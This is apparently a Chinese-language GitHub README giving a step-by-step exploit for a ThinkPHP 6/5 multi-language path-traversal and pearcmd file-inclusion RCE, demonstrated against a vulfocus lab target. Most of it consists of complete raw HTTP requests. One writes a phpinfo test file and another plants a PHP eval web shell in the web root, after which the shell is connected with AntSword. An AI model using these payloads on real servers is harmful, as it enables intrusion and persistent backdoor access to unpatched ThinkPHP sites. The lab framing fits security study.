# Thinkphp6-Lang-rce
个人测试成功上传，该项目中出现的地址均为vulfocus靶场地址。靶场地址为：https://vulfocus.cn/#/dashboard                                                                         

由于该漏洞有多种方法，在此我只是分享其中一种方法，大佬勿喷。还在学习中的一个小白。上传检测的脚本只限内查使用，如出现问题个人承担后果。由于脚本是网络收集，如有侵权请联系作者删除。

漏洞描述                                                                                                                                                                 
如果 Thinkphp 程序开启了多语言功能，攻击者可以通过 get、header、cookie 等位置传入参数，实现目录穿越+文件包含，通过 pearcmd 文件包含这个 trick 即可实现 RCE。

影响范围                                                                                                                                                                 
v6.0.1 < Thinkphp < v6.0.13                                                                                                                                             
Thinkphp v5.0.x                                                                                                                                                         
Thinkphp v5.1.x

第一步:测试环境是否在影响范围之中                                                                                                                                         
![image](https://user-images.githubusercontent.com/73454853/210168939-aa10f490-4e45-4da6-ba27-25b3d5393ff3.png)

第二步:尝试上传一个phpinfo并访问                                                                                                                                         
GET /public/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1                                     
Host: 123.58.224.8:42571                                                                                                                                               
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0                                                                           
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8                                                                           
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2                                                                                           
Accept-Encoding: gzip, deflate                                                                                                                                         
Connection: close                                                                                                                                                       
Cookie: Cookie: think-lang:zh-cn                                                                                                                                       
Upgrade-Insecure-Requests: 1

![image](https://user-images.githubusercontent.com/73454853/210169090-d916f2b8-8f69-4e1b-a5d3-90f0acc260c6.png)

尝试访问，出现phpinfo的页面则成功                                                                                                                                         
http://123.58.224.8:42571/public/index.php?lang=../../../../../../../../tmp/hello
![image](https://user-images.githubusercontent.com/73454853/210169223-21ae832c-7506-41e2-bf12-5ba61554e536.png)

尝试上传后门                                                                                                                                                             
GET /public/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_POST['ant']);?>+/var/www/html/1.php HTTP/1.1                 
Host: 123.58.224.8:42571                                                                                                                                               
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0                                                                           
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8                                                                           
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2                                                                                           
Accept-Encoding: gzip, deflate                                                                                                                                         
Connection: close                                                                                                                                                       
Cookie: think_lang=zh-cn                                                                                                                                               
Upgrade-Insecure-Requests: 1                                                                                                                                           

![image](https://user-images.githubusercontent.com/73454853/210169516-9a3bda35-4ae8-4e9c-9867-f9af6167876e.png)

尝试用蚁剑进行连接
![image](https://user-images.githubusercontent.com/73454853/210169499-2fc17cae-7714-4a73-ad5b-9b93a26ce365.png)

